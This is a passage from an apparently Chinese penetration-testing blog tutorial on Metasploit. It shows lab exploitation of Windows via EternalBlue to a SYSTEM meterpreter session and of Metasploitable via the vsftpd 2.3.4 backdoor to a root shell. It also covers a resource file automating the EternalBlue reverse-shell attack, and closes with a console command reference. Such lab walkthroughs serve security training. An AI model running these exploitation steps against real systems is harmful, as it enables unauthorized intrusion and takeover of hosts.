-l -v</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Session ID: 1</span><br><span class="line">        Name: </span><br><span class="line">        Type: meterpreter windows</span><br><span class="line">        Info: NT AUTHORITY\SYSTEM @ WIN-LTME4DTVE8Q</span><br><span class="line">      Tunnel: 192.168.197.193:4444 -&gt; 192.168.197.195:65118 (192.168.197.195)</span><br><span class="line">         Via: exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">   Encrypted: true</span><br><span class="line">        UUID: d32a7409c7ab99a4/x64=2/windows=1/2020-02-14T05:46:51Z</span><br><span class="line">     CheckIn: 21s ago @ 2020-02-14 13:49:54 +0800</span><br><span class="line">  Registered: No</span><br></pre></td></tr></table></figure>

<p><code>sessions -i 1</code>这个命令让与ID为1的控制会话进行交互，输入<code>shell</code>进入了目标系统交互命令shell中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3388 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br></pre></td></tr></table></figure>

<h3 id="0x03-测试metasploitable"><a href="#0x03-测试metasploitable" class="headerlink" title="0x03 测试metasploitable"></a>0x03 测试metasploitable</h3><p>这个例子我们通过扫描，然后使用vsftpd来进行测试</p>
<p>第一步，使用nmap扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; nmap -sT -A -PO 192.168.197.197</span><br><span class="line">[*] exec: nmap -sT -A -PO 192.168.197.197</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-14 14:05 CST</span><br><span class="line">Nmap scan report for 192.168.197.197</span><br><span class="line">Host is up (0.046s latency).</span><br><span class="line">Not shown: 977 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br></pre></td></tr></table></figure>

<p>第二步，搜索<code>vsftpd</code>渗透模块，配置所需参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search vsftpd</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show payloads </span><br><span class="line"></span><br><span class="line">Compatible Payloads</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   #  Name               Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----               ---------------  ----    -----  -----------</span><br><span class="line">   0  cmd/unix/interact                   normal  No     Unix Command, Interact with Established Connection</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set payload cmd/unix/interact </span><br><span class="line">payload =&gt; cmd/unix/interact</span><br><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOSTS 192.168.197.197</span><br><span class="line">RHOSTS =&gt; 192.168.197.197</span><br><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/ftp/vsftpd_234_backdoor):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  192.168.197.197  yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT   21               yes       The target port (TCP)</span><br></pre></td></tr></table></figure>

<p>第三步，使用<code>exploit命令执行</code>，这里我们使用的使用了一个绑定<code>bind</code>交互式shell，是在目标主机上打开一个监听端口，然后促使我们可以直接与目标系统的连接如果是在防火墙或<code>NAT</code>网关后的主机，则应该使用反弹式连接攻击载荷</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] 192.168.197.197:21 - Banner: 220 (vsFTPd 2.3.4)</span><br><span class="line">[*] 192.168.197.197:21 - USER: 331 Please specify the password.</span><br><span class="line">[+] 192.168.197.197:21 - Backdoor service has been spawned, handling...</span><br><span class="line">[+] 192.168.197.197:21 - UID: uid=0(root) gid=0(root)</span><br><span class="line">[*] Found shell.</span><br><span class="line">[*] Command shell session 2 opened (192.168.197.193:46319 -&gt; 192.168.197.197:6200) at 2020-02-14 14:14:43 +0800</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<h3 id="0x04-资源文件"><a href="#0x04-资源文件" class="headerlink" title="0x04 资源文件"></a>0x04 资源文件</h3><p>资源文件（<code>resource file</code>）是MSF终端内包含一系列自动化命令的脚本文件。这些文件时一个可以在MSF终端中执行的命令列表，列表中的命令将按顺序执行，举两个例子如下</p>
<p>一、创建一个现实metasploit版本的资源文件运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo version &gt;resource.rc</span><br><span class="line">root@kali:~# echo load sounds &gt;&gt;resource.rc</span><br><span class="line">root@kali:~# msfconsole -r resource.rc </span><br><span class="line">......</span><br><span class="line">[*] Processing resource.rc for ERB directives.</span><br><span class="line">resource (resource.rc)&gt; version</span><br><span class="line">Framework: 5.0.46-dev</span><br><span class="line">Console  : 5.0.46-dev</span><br><span class="line">resource (resource.rc)&gt; load sounds</span><br><span class="line">[*] Successfully loaded plugin: sounds</span><br><span class="line">[*] Starting persistent handler(s)...</span><br></pre></td></tr></table></figure>

<p>二、创建一个ms17-010攻击的资源文件运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo use exploit/windows/smb/ms17_010_eternalblue &gt; pentest.rc</span><br><span class="line">root@kali:~# echo set RHOSTS 192.168.197.195 &gt;&gt; pentest.rc</span><br><span class="line">root@kali:~# echo set payload windows/x64/meterpreter/reverse_tcp &gt;&gt; pentest.rc</span><br><span class="line">root@kali:~# echo set LHOST 192.168.197.193 &gt;&gt; pentest.rc</span><br><span class="line">root@kali:~# echo exploit &gt;&gt; pentest.rc</span><br><span class="line">root@kali:~# msfconsole -r pentest.rc </span><br><span class="line">......</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x05-MSF终端命令参考列表"><a href="#0x05-MSF终端命令参考列表" class="headerlink" title="0x05 MSF终端命令参考列表"></a>0x05 MSF终端命令参考列表</h3><p><code>search</code>: 搜索渗透攻击或辅助模块，可以模糊搜索也可以精确搜索</p>
<p><code>show options</code>: 列出metasploit框架中的所有渗透攻击模块</p>
<p><code>show payloads</code>: 列出metasploit框架中所有的攻击载荷</p>
<p><code>show auxiliary</code>: 列出metasploit框架中的所有辅助攻击模块</p>
<p><code>search name</code>: 查找metasploit框架中所有的渗透攻击和其他模块</p>
<p><code>info</code>: 展示出指定渗透攻击或模块的相关信息</p>
<p><code>use name</code>: 装载一个渗透攻击或模块</p>
<p><code>LHOST</code>: 本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共的IP地址，为反弹式shell使用</p>
<p><code>RHOST</code>：远程主机或目标主机</p>
<p><code>set function</code>: 设置特定的配置参数，如设置本地或远程主机参数</p>
<p><code>setg function</code>: 以全局方式设置特定的配置参数，如设置本地或远程主机参数</p>
<p><code>show options</code>: 列出某个渗透攻击或模块中所有的配置参数</p>
<p><code>show targets</code>: 列出渗透攻击所支持的平台</p>
<p><code>set target num</code>: 指定你所知道的目标的操作系统以及补丁版本类型</p>
<p><code>set payload payload</code>: 指定想要使用的攻击载荷</p>
<p><code>show advanced</code>: 列出所有高级配置选项</p>
<p><code>set autorunscript migrate -f</code>: 在渗透攻击完成后，将自动迁移到另一个进程</p>
<p><code>check</code>: 检测目标是否对选定渗透攻击存在相应安全漏洞</p>
<p><code>exploit</code>: 执行渗透攻击或模块来攻击目标</p>
<p><code>exploit -j</code>: 在计划任务下进行渗透攻击（攻击将在后台进行）</p>
<p><code>exploit -z</code>: 渗透攻击成功后不与会话进行交互</p>
<p><code>exploit -e encoder</code>: 指定使用的攻击载荷编码方式</p>
<p><code>exploit -h</code>: 列出exploit命令帮助信息</p>
<p><code>sessions -l</code>: 列出可用的交互会话（在处理多个shell时使用）</p>
<p><code>sessions -l -v</code>: 列出所有可用的交互会话以及会话详细信息，如攻击系统时使用什么安全漏洞</p>
<p><code>sessions -s script</code>: 在所有活跃的Meterpreter会话中运行一个特定的meterpreter脚本</p>
<p><code>session -K</code>: 杀死所有活跃的交互会话</p>
<p><code>session -c cmd</code>: 在所有活跃的Meterpreter会话上执行一个命令</p>
<p><code>sessions -u sessionID</code>: 升级一个普通的win 32 shell到meterpreter shell</p>
<p><code>db_create name</code>: 创建一个数据库驱动攻击所要用使用的数据库</p>
<p><code>db_connect name</code>: 创建并连接一个数据库驱动攻击所要使用的数据库</p>
<p><code>workspace</code>: 列出当前连接的数据库中所有的工作空间</p>
<p><code>workspace name</code>: 使用指定的工作空间</p>
<p><code>workspace -a name</code>: 创建一个工作空间</p>
<p><code>workspace -d name</code>: 删除指定的工作空间</p>
<p><code>workspace -D</code>: 删除所有工作空间</p>
<p><code>workspace -r old new</code>: 重命名工作空间</p>
<p><code>db_nmap</code>: 利用nmap并把扫描数据存储到数据库中</p>
<p><code>db_rebuild_cache</code>: 创建数据库缓存，这样在之后的搜索中会提升效率</p>
<p><code>db_disconnect</code>: 断开当前数据库连接</p>
<p><code>db_connect</code>: 连接指定的数据库（<code>usr/share/metasploit-framework/config/database.yml</code>）</p>
<p><code>db_import</code>: 导入数据库</p>
<p><code>db_export -f</code>: 指定格式导出</p>
<p><code>route</code>: 通过指定session路由流量</p>
<p>参考链接</p>
<p>metasploit渗透测试指南</p>
</div><!--文章标签--><div class="tags"><a href="/tags/metasploit/">metasploit</a></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">19</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/复现/">复现</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/metasploit/" style="font-size: 16px;">metasploit</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/远程代码执行/" style="font-size: 16px;">远程代码执行</a> <a href="/tags/文件读取/" style="font-size: 12px;">文件读取</a> <a href="/tags/cobaltstrike/" style="font-size: 14px;">cobaltstrike</a> <a href="/tags/Cobalt-Strike/" style="font-size: 12px;">Cobalt Strike</a> <a href="/tags/安全开发/" style="font-size: 12px;">安全开发</a> <a href="/tags/Ngrok/" style="font-size: 12px;">Ngrok</a> <a href="/tags/文件包含/" style="font-size: 12px;">文件包含</a> <a href="/tags/PowerShell/" style="font-size: 18px;">PowerShell</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/QCOW2/" style="font-size: 12px;">QCOW2</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/venom/" style="font-size: 12px;">venom</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/免杀/" style="font-size: 16px;">免杀</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/端口转发/" style="font-size: 12px;">端口转发</a> <a href="/tags/Covenant/" style="font-size: 12px;">Covenant</a> <a href="/tags/meterpreter/" style="font-size: 12px;">meterpreter</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/msfvenom/" style="font-size: 12px;">msfvenom</a> <a href="/tags/域信息收集/" style="font-size: 14px;">域信息收集</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/06/24/CobaltStrike二次开发环境准备/">CobaltStrike二次开发环境准备</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/15/权限提升分析及防御二/">权限提升分析及防御二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/11/权限提升分析及防御一/">权限提升分析及防御一</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/08/IntelliJ-IDEA修改cobaltstrike/">IntelliJ-IDEA修改cobaltstrike</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/09/利用msf自带的route模块穿透目标内网/">利用msf自带的route模块穿透目标内网</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/07/使用Venom搭建二级代理/">使用Venom搭建二级代理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/隐藏通信隧道技术二/">隐藏通信隧道技术二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/22/隐藏通信隧道技术/">隐藏通信隧道技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/18/Mac配置PyQt5-pyCharm并使用/">Mac配置PyQt5+pyCharm并使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/14/Covenant/">Covenant</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
  if($(".highlight").length != 0){
    var pc_width = $(".post-content").width();
    $(".highlight .code").find("pre").width((pc_width-70)+"px");
  }
}
window.onresize = function(){
  auto_code_fit();
}
auto_code_fit();</script></div></body>